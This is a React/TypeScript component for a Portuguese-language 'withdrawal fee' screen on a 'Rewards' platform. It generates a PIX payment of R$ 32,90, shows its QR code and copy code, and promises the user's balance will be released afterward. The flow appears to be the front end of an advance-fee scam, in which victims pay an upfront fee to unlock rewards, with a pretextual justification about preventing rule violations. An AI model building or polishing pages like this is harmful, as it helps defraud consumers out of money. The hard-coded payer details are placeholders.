import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { AlertTriangle, ArrowRight, Copy, CheckCircle2 } from 'lucide-react';
import { gerarPix } from '../api/pixApi';

interface FailureScreenProps {
  onContinue: () => void;
}

export const FailureScreen: React.FC<FailureScreenProps> = ({ onContinue }) => {
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [pixData, setPixData] = useState<{ pixQrCode: string; pixCode: string } | null>(null);
  const [copied, setCopied] = useState(false);

  const handleGeneratePix = async () => {
    try {
      setLoading(true);
      setError(null);

      const response = await gerarPix(
        'João Silva',
        'joao.silva@example.com',
        '12345678900',
        '11999999999',
        3290, // R$ 32,90 em centavos
        'Taxa de Saque Rewards'
      );

      setPixData({
        pixQrCode: response.pixQrCode,
        pixCode: response.pixCode
      });
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Erro ao gerar o PIX');
    } finally {
      setLoading(false);
    }
  };

  const copyPixCode = async () => {
    if (pixData?.pixCode) {
      try {
        await navigator.clipboard.writeText(pixData.pixCode);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      } catch (err) {
        console.error('Failed to copy:', err);
      }
    }
  };

  return (
    <div className="min-h-screen flex items-center justify-center p-4 relative">
      <div className="absolute inset-0 bg-gradient-to-br from-[#FF6B00] via-[#FF8500] to-[#FFA500]">
        <div className="absolute inset-0 bg-black bg-opacity-20"></div>
      </div>
      
      <motion.div 
        className="bg-white/95 backdrop-blur-xl rounded-xl shadow-2xl p-8 max-w-md w-full relative z-10"
        initial={{ scale: 0.9, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        transition={{ duration: 0.5 }}
      >
        <div className="text-center space-y-6">
          <motion.div 
            className="w-20 h-20 bg-red-50 rounded-full flex items-center justify-center mx-auto"
            initial={{ scale: 0 }}
            animate={{ scale: 1 }}
            transition={{ type: "spring", stiffness: 200, delay: 0.2 }}
          >
            <AlertTriangle className="w-10 h-10 text-red-500" />
          </motion.div>
          
          <motion.div
            initial={{ y: 20, opacity: 0 }}
            animate={{ y: 0, opacity: 1 }}
            transition={{ delay: 0.3 }}
          >
            <h2 className="text-2xl font-semibold mb-2">Taxa de Saque</h2>
            <p className="text-gray-500 mb-4">
              Para realizar seu primeiro saque na plataforma Rewards, é necessário pagar uma taxa de saque de R$ 32,90. 
              Essa taxa é aplicada para prevenir tentativas que violem as regras da atividade.
            </p>
          </motion.div>

          {!pixData && !loading && (
            <motion.button
              onClick={handleGeneratePix}
              className="w-full py-4 px-6 bg-gradient-to-r from-[#FF6B00] to-[#FF8500] text-white rounded-lg font-semibold hover:shadow-lg transform hover:scale-105 transition-all duration-300 flex items-center justify-center gap-2"
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              initial={{ y: 20, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              transition={{ delay: 0.4 }}
            >
              Gerar PIX
              <ArrowRight className="w-5 h-5" />
            </motion.button>
          )}

          {loading && (
            <motion.div 
              className="space-y-4"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
            >
              <div className="flex items-center justify-center space-x-2">
                <div className="w-4 h-4 bg-[#FF6B00] rounded-full animate-bounce" />
                <div className="w-4 h-4 bg-[#FF8500] rounded-full animate-bounce [animation-delay:-.3s]" />
                <div className="w-4 h-4 bg-[#FFA500] rounded-full animate-bounce [animation-delay:-.5s]" />
              </div>
              <p className="text-gray-600">Gerando PIX...</p>
            </motion.div>
          )}

          {error && (
            <motion.div
              className="bg-red-50 text-red-500 p-4 rounded-lg"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
            >
              <p className="font-semibold">Erro ao gerar PIX:</p>
              <p className="text-sm">{error}</p>
            </motion.div>
          )}

          {pixData && (
            <motion.div
              className="space-y-4"
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
            >
              <div className="bg-gray-50 p-4 rounded-lg">
                <img 
                  src={pixData.pixQrCode}
                  alt="QR Code PIX"
                  className="w-48 h-48 mx-auto"
                />
              </div>

              <div className="relative">
                <div 
                  className="bg-gray-50 p-4 rounded-lg pr-12 break-all text-sm font-mono"
                >
                  {pixData.pixCode}
                </div>
                <button
                  onClick={copyPixCode}
                  className="absolute right-2 top-1/2 -translate-y-1/2 p-2 text-gray-500 hover:text-gray-700"
                >
                  {copied ? (
                    <CheckCircle2 className="w-5 h-5 text-green-500" />
                  ) : (
                    <Copy className="w-5 h-5" />
                  )}
                </button>
              </div>

              <p className="text-sm text-gray-500">
                Após o pagamento, seu saldo será liberado automaticamente.
              </p>
            </motion.div>
          )}
        </div>
      </motion.div>
    </div>
  );
};